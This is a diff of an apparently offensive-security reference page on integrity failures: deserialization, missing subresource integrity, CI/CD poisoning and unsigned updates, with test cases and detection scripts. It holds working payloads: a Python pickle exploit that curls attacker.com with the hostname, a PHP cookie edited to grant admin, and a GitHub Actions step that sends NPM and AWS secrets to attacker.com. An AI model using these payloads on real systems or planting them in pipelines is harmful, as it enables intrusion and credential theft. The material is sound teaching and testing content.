-</span></span><span style="display:flex;"><span>curl -s -b <span style="color:#e6db74">&#34;session=</span>$PAYLOAD<span style="color:#e6db74">&#34;</span> https://target.com/dashboard
-</span></span></code></pre></div><p>PHP object manipulation (privilege escalation without full RCE):</p>
+</span></span><span style="display:flex;"><span>curl -s -b <span style="color:#e6db74">&#34;session=</span>$PAYLOAD<span style="color:#e6db74">&#34;</span> https://target.com/dashboard</span></span></code></pre></div><p>PHP object manipulation (privilege escalation without full RCE):</p>
 <pre tabindex="0"><code>Original cookie (Base64 decoded):
 O:4:&#34;User&#34;:2:{s:4:&#34;name&#34;;s:5:&#34;alice&#34;;s:4:&#34;role&#34;;s:4:&#34;user&#34;;}
 
 Modified (change role value):
 O:4:&#34;User&#34;:2:{s:4:&#34;name&#34;;s:5:&#34;alice&#34;;s:4:&#34;role&#34;;s:5:&#34;admin&#34;;}
 
-Re-encode to Base64 and submit — application grants admin role
-</code></pre><h3 id="5-insecure-deserialization--python-pickle">
-  5. Insecure Deserialization — Python Pickle
-  <a class="anchor" href="#5-insecure-deserialization--python-pickle">#</a>
-</h3>
+Re-encode to Base64 and submit — application grants admin role</code></pre><h3 id="5-insecure-deserialization--python-pickle">5. Insecure Deserialization — Python Pickle<a class="anchor" href="#5-insecure-deserialization--python-pickle">#</a></h3>
 <p>Python&rsquo;s <code>pickle</code> module executes arbitrary code on deserialization. Any endpoint loading user-supplied pickled data is RCE.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle<span style="color:#f92672">,</span> os<span style="color:#f92672">,</span> base64
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle<span style="color:#f92672">,</span> os<span style="color:#f92672">,</span> base64
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Craft a malicious pickle payload</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exploit</span>(object):
@@ -1476,124 +1435,99 @@ Re-encode to Base64 and submit — application grants admin role
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#34;curl http://attacker.com/pickle?h=$(hostname)&#34;</span>,))
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(pickle<span style="color:#f92672">.</span>dumps(Exploit()))<span style="color:#f92672">.</span>decode()
-</span></span><span style="display:flex;"><span>print(payload)   <span style="color:#75715e"># Submit this as the session cookie or API parameter</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Identify pickle in HTTP traffic</span>
+</span></span><span style="display:flex;"><span>print(payload)   <span style="color:#75715e"># Submit this as the session cookie or API parameter</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Identify pickle in HTTP traffic</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Base64 cookie starting with gASV or 80 04 (pickle protocol 4)</span>
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;gASV...&#34;</span> | base64 -d | python3 -c <span style="color:#e6db74">&#34;import sys,pickle; pickle.loads(sys.stdin.buffer.read())&#34;</span>
-</span></span></code></pre></div><h3 id="6-cdn-hijack--missing-subresource-integrity-sri">
-  6. CDN Hijack / Missing Subresource Integrity (SRI)
-  <a class="anchor" href="#6-cdn-hijack--missing-subresource-integrity-sri">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;gASV...&#34;</span> | base64 -d | python3 -c <span style="color:#e6db74">&#34;import sys,pickle; pickle.loads(sys.stdin.buffer.read())&#34;</span></span></span></code></pre></div><h3 id="6-cdn-hijack--missing-subresource-integrity-sri">6. CDN Hijack / Missing Subresource Integrity (SRI)<a class="anchor" href="#6-cdn-hijack--missing-subresource-integrity-sri">#</a></h3>
 <p><code>&lt;script&gt;</code> tags loading external resources without an <code>integrity</code> hash execute whatever the CDN serves — including attacker-modified content.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- Vulnerable — no integrity check --&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- Vulnerable — no integrity check --&gt;</span>
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdn.polyfill.io/v2/polyfill.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- What to check for in target HTML source --&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- If no integrity= attribute → vulnerable to CDN compromise --&gt;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Scan target page HTML for external scripts without SRI</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- If no integrity= attribute → vulnerable to CDN compromise --&gt;</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Scan target page HTML for external scripts without SRI</span>
 </span></span><span style="display:flex;"><span>curl -s https://target.com/ | grep -E <span style="color:#e6db74">&#39;&lt;script[^&gt;]+src=&#39;</span> | grep -v <span style="color:#e6db74">&#39;integrity=&#39;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Any result = CDN resource loaded without integrity verification</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Generate correct SRI hash for a file</span>
 </span></span><span style="display:flex;"><span>curl -s https://cdn.example.com/lib.min.js | <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  openssl dgst -sha384 -binary | openssl base64 -A
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Compare against integrity= attribute value in source</span>
-</span></span></code></pre></div><h3 id="7-cicd-pipeline-poisoning">
-  7. CI/CD Pipeline Poisoning
-  <a class="anchor" href="#7-cicd-pipeline-poisoning">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span>  openssl dgst -sha384 -binary | openssl base64 -A
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Compare against integrity= attribute value in source</span></span></span></code></pre></div><h3 id="7-cicd-pipeline-poisoning">7. CI/CD Pipeline Poisoning<a class="anchor" href="#7-cicd-pipeline-poisoning">#</a></h3>
 <p>Attacker with write access to a repository, workflow file, or referenced action injects malicious steps that execute during build — exfiltrating secrets or backdooring artifacts.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#75715e"># Malicious GitHub Actions step injected into .github/workflows/build.yml</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#75715e"># Malicious GitHub Actions step injected into .github/workflows/build.yml</span>
 </span></span><span style="display:flex;"><span>- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Build</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    curl -s https://attacker.com/exfil?token=${{ secrets.NPM_TOKEN }}
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    curl -s https://attacker.com/exfil?aws=${{ secrets.AWS_ACCESS_KEY }}</span>    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    curl -s https://attacker.com/exfil?aws=${{ secrets.AWS_ACCESS_KEY }}</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Mutable action reference (vulnerable — tag can be moved)</span>
 </span></span><span style="display:flex;"><span>- <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">some-org/some-action@v1  </span> <span style="color:#75715e"># ← tag can point to attacker commit</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Pinned by commit SHA (safer)</span>
-</span></span><span style="display:flex;"><span>- <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">some-org/some-action@a1b2c3d4e5f6 </span> <span style="color:#75715e"># ← immutable</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Audit GitHub Actions for unpinned / third-party action references</span>
+</span></span><span style="display:flex;"><span>- <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">some-org/some-action@a1b2c3d4e5f6 </span> <span style="color:#75715e"># ← immutable</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Audit GitHub Actions for unpinned / third-party action references</span>
 </span></span><span style="display:flex;"><span>grep -r <span style="color:#e6db74">&#34;uses:&#34;</span> .github/workflows/ | grep -v <span style="color:#e6db74">&#34;@[a-f0-9]\{40\}&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Any result using a tag (@v1, @main) instead of a full SHA = mutable reference</span>
-</span></span></code></pre></div><h3 id="8-unsigned--unverified-update-mechanism">
-  8. Unsigned / Unverified Update Mechanism
-  <a class="anchor" href="#8-unsigned--unverified-update-mechanism">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Any result using a tag (@v1, @main) instead of a full SHA = mutable reference</span></span></span></code></pre></div><h3 id="8-unsigned--unverified-update-mechanism">8. Unsigned / Unverified Update Mechanism<a class="anchor" href="#8-unsigned--unverified-update-mechanism">#</a></h3>
 <p>Application downloads and executes an update without verifying a digital signature — attacker who can MITM the update channel or compromise the update server delivers arbitrary code.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Test if update endpoint serves over HTTP (unencrypted = trivial MITM)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Test if update endpoint serves over HTTP (unencrypted = trivial MITM)</span>
 </span></span><span style="display:flex;"><span>curl -I http://target.com/update/latest.pkg
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if downloaded binary is signature-verified</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Absence of signature check in update logic:</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># wget http://updates.target.com/app-v2.bin</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># chmod +x app-v2.bin &amp;&amp; ./app-v2.bin   ← no hash/signature check</span>
-</span></span></code></pre></div><h3 id="test-cases">
-  Test Cases
-  <a class="anchor" href="#test-cases">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># chmod +x app-v2.bin &amp;&amp; ./app-v2.bin   ← no hash/signature check</span></span></span></code></pre></div><h3 id="test-cases">Test Cases<a class="anchor" href="#test-cases">#</a></h3>
 <table>
-<thead>
-<tr>
-<th>Scenario</th>
-<th>Action</th>
-<th>Expected Outcome</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Dependency Confusion</td>
-<td>Publish higher-version public package matching internal name</td>
-<td>Build system pulls attacker package; preinstall hook executes</td>
-</tr>
-<tr>
-<td>Typosquatting</td>
-<td>Install misspelled package name</td>
-<td>Malicious <code>setup.py</code> / preinstall hook runs</td>
-</tr>
-<tr>
-<td>Java Deserialization</td>
-<td>Submit <code>rO0</code>-prefixed cookie with URLDNS payload</td>
-<td>DNS callback confirms gadget chain execution</td>
-</tr>
-<tr>
-<td>PHP Object Injection</td>
-<td>Modify serialized role field in cookie</td>
-<td>Admin privilege granted without authentication</td>
-</tr>
-<tr>
-<td>Python Pickle</td>
-<td>Submit base64 pickle payload to session endpoint</td>
-<td>RCE callback received</td>
-</tr>
-<tr>
-<td>Missing SRI</td>
-<td>Load page; check <code>&lt;script src&gt;</code> tags for <code>integrity=</code></td>
-<td>External scripts load without hash verification</td>
-</tr>
-<tr>
-<td>CI/CD Secrets Exfil</td>
-<td>Inject curl step into workflow via PR</td>
-<td>Secrets exfiltrated to attacker-controlled endpoint</td>
-</tr>
-<tr>
-<td>Unsigned Update</td>
-<td>Intercept update download over HTTP</td>
-<td>Replace binary with malicious payload</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Scenario</th>
+					<th>Action</th>
+					<th>Expected Outcome</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Dependency Confusion</td>
+					<td>Publish higher-version public package matching internal name</td>
+					<td>Build system pulls attacker package; preinstall hook executes</td>
+			</tr>
+			<tr>
+					<td>Typosquatting</td>
+					<td>Install misspelled package name</td>
+					<td>Malicious <code>setup.py</code> / preinstall hook runs</td>
+			</tr>
+			<tr>
+					<td>Java Deserialization</td>
+					<td>Submit <code>rO0</code>-prefixed cookie with URLDNS payload</td>
+					<td>DNS callback confirms gadget chain execution</td>
+			</tr>
+			<tr>
+					<td>PHP Object Injection</td>
+					<td>Modify serialized role field in cookie</td>
+					<td>Admin privilege granted without authentication</td>
+			</tr>
+			<tr>
+					<td>Python Pickle</td>
+					<td>Submit base64 pickle payload to session endpoint</td>
+					<td>RCE callback received</td>
+			</tr>
+			<tr>
+					<td>Missing SRI</td>
+					<td>Load page; check <code>&lt;script src&gt;</code> tags for <code>integrity=</code></td>
+					<td>External scripts load without hash verification</td>
+			</tr>
+			<tr>
+					<td>CI/CD Secrets Exfil</td>
+					<td>Inject curl step into workflow via PR</td>
+					<td>Secrets exfiltrated to attacker-controlled endpoint</td>
+			</tr>
+			<tr>
+					<td>Unsigned Update</td>
+					<td>Intercept update download over HTTP</td>
+					<td>Replace binary with malicious payload</td>
+			</tr>
+	</tbody>
 </table>
-<h2 id="detection-techniques-offensive-perspective">
-  Detection Techniques (Offensive Perspective)
-  <a class="anchor" href="#detection-techniques-offensive-perspective">#</a>
-</h2>
-<h3 id="manual-detection--identifying-integrity-failures">
-  Manual Detection — Identifying Integrity Failures
-  <a class="anchor" href="#manual-detection--identifying-integrity-failures">#</a>
-</h3>
+<h2 id="detection-techniques-offensive-perspective">Detection Techniques (Offensive Perspective)<a class="anchor" href="#detection-techniques-offensive-perspective">#</a></h2>
+<h3 id="manual-detection--identifying-integrity-failures">Manual Detection — Identifying Integrity Failures<a class="anchor" href="#manual-detection--identifying-integrity-failures">#</a></h3>
 <p><strong>Serialized Object Detection in Traffic</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Intercept requests with Burp — look for these patterns in cookies/params/bodies:</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Intercept requests with Burp — look for these patterns in cookies/params/bodies:</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Java:   rO0 (Base64) or AC ED (hex)</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># PHP:    O:&lt;n&gt;:&#34;ClassName&#34;:  or a:&lt;n&gt;: (array)</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Python: gASV (Base64 pickle protocol 4) or 80 04 (binary)</span>
@@ -1601,9 +1535,8 @@ Re-encode to Base64 and submit — application grants admin role
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Decode and inspect a suspicious cookie</span>
 </span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;rO0ABXNyABRq...&#34;</span> | base64 -d | strings | head -20
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Class names, library names in output → identify gadget chain candidates</span>
-</span></span></code></pre></div><p><strong>Missing SRI on External Resources</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> re
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Class names, library names in output → identify gadget chain candidates</span></span></span></code></pre></div><p><strong>Missing SRI on External Resources</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> re
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.request
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://target.com/&#34;</span>
@@ -1620,17 +1553,12 @@ Re-encode to Base64 and submit — application grants admin role
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Only flag external scripts (full URLs pointing off-domain)</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> src<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;http&#34;</span>) <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;target.com&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> src:
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;integrity=&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> tag<span style="color:#f92672">.</span>lower():
-</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[NO SRI] </span><span style="color:#e6db74">{</span>src<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span></code></pre></div><p><strong>Internal Package Name Discovery</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Search GitHub for the target&#39;s package.json / requirements.txt / pom.xml</span>
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[NO SRI] </span><span style="color:#e6db74">{</span>src<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)</span></span></code></pre></div><p><strong>Internal Package Name Discovery</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Search GitHub for the target&#39;s package.json / requirements.txt / pom.xml</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Look for packages not found on public registries</span>
 </span></span><span style="display:flex;"><span>npm view &lt;package-name&gt;    <span style="color:#75715e"># E04 / 404 = not on npm = dependency confusion candidate</span>
-</span></span><span style="display:flex;"><span>pip index versions &lt;pkg&gt;   <span style="color:#75715e"># error = not on PyPI</span>
-</span></span></code></pre></div><h3 id="automated-detection">
-  Automated Detection
-  <a class="anchor" href="#automated-detection">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Scan for Java deserialization markers in all HTTP responses</span>
+</span></span><span style="display:flex;"><span>pip index versions &lt;pkg&gt;   <span style="color:#75715e"># error = not on PyPI</span></span></span></code></pre></div><h3 id="automated-detection">Automated Detection<a class="anchor" href="#automated-detection">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Scan for Java deserialization markers in all HTTP responses</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Run through Burp with Java Deserialization Scanner extension</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Or grep proxy logs:</span>
 </span></span><span style="display:flex;"><span>grep -r <span style="color:#e6db74">&#34;rO0AB&#34;</span> burp_logs/ | cut -d: -f1 | sort -u
@@ -1640,20 +1568,19 @@ Re-encode to Base64 and submit — application grants admin role
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Check all CDN script tags for missing SRI in bulk</span>
 </span></span><span style="display:flex;"><span>gospider -s https://target.com -d <span style="color:#ae81ff">1</span> -q <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  | grep -oP <span style="color:#e6db74">&#39;src=&#34;https?://[^&#34;]+&#34;&#39;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  | <span style="color:#66d9ef">while</span> read src; <span style="color:#66d9ef">do</span>
+</span></span></span><span style="display:flex;"><span>  | grep -oP <span style="color:#e6db74">&#39;src=&#34;https?://[^&#34;]+&#34;&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  | <span style="color:#66d9ef">while</span> read src; <span style="color:#66d9ef">do</span>
 </span></span><span style="display:flex;"><span>      url<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $src | grep -oP <span style="color:#e6db74">&#39;https?://[^&#34;]+&#39;</span><span style="color:#66d9ef">)</span>
 </span></span><span style="display:flex;"><span>      echo <span style="color:#e6db74">&#34;Checking: </span>$url<span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span>      curl -s https://target.com/ | grep -q <span style="color:#e6db74">&#34;integrity=&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;[MISSING SRI] </span>$url<span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">done</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Detect PHP serialized objects in parameter values</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">done</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Detect PHP serialized objects in parameter values</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> re
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;https://target.com/&#39;</span>)
 </span></span><span style="display:flex;"><span>cookies <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>cookies
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> name, value <span style="color:#f92672">in</span> cookies<span style="color:#f92672">.</span>items():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>match(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;^O:\d+:&#39;</span>, value) <span style="color:#f92672">or</span> re<span style="color:#f92672">.</span>match(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;^a:\d+:&#39;</span>, value):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;^O:\d+:&#39;</span>, value) <span style="color:#f92672">or</span> re<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;^a:\d+:&#39;</span>, value):
 </span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[PHP SERIALIZED] Cookie: </span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74"> = </span><span style="color:#e6db74">{</span>value[:<span style="color:#ae81ff">60</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">...&#39;</span>)
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> base64
@@ -1661,11 +1588,7 @@ Re-encode to Base64 and submit — application grants admin role
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> decoded[:<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xac\xed</span><span style="color:#e6db74">&#39;</span>:
 </span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[JAVA SERIALIZED] Cookie: </span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
-</span></span></code></pre></div><h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span></span></span></code></pre></div><h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li><strong>RCE at Build Time:</strong> Dependency confusion / typosquatting executes attacker code on developer machines and CI runners during <code>npm install</code> / <code>pip install</code></li>
 <li><strong>RCE at Runtime:</strong> Insecure deserialization of Java, PHP, or Python objects executes arbitrary OS commands on the application server</li>
@@ -1674,60 +1597,54 @@ Re-encode to Base64 and submit — application grants admin role
 <li><strong>Privilege Escalation:</strong> Modifying serialized role/permission fields in cookies or hidden fields grants admin access without credentials</li>
 <li><strong>Persistent Backdoor:</strong> Malicious update or poisoned build artifact installs persistent access across all user endpoints</li>
 </ul>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Tool</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>ysoserial</td>
-<td>Java deserialization gadget chain payload generator</td>
-</tr>
-<tr>
-<td>PHPGGC</td>
-<td>PHP gadget chain generator for common frameworks</td>
-</tr>
-<tr>
-<td>Burp Java Deserialization Scanner</td>
-<td>Passive/active detection of Java serialization in HTTP traffic</td>
-</tr>
-<tr>
-<td>Retire.js</td>
-<td>Detect vulnerable/outdated JS libraries loaded from CDN</td>
-</tr>
-<tr>
-<td>OWASP Dependency-Check</td>
-<td>SCA — scan project dependencies for known CVEs</td>
-</tr>
-<tr>
-<td>pip-audit / npm audit</td>
-<td>Audit Python / Node.js dependencies for known vulnerabilities</td>
-</tr>
-<tr>
-<td>Trivy</td>
-<td>Container and filesystem vulnerability scanning including dependencies</td>
-</tr>
-<tr>
-<td>interactsh / Burp Collaborator</td>
-<td>Out-of-band callback for blind deserialization confirmation</td>
-</tr>
-<tr>
-<td>gospider</td>
-<td>Crawl and extract external resource URLs for SRI audit</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Tool</th>
+					<th>Purpose</th>
+			</tr>
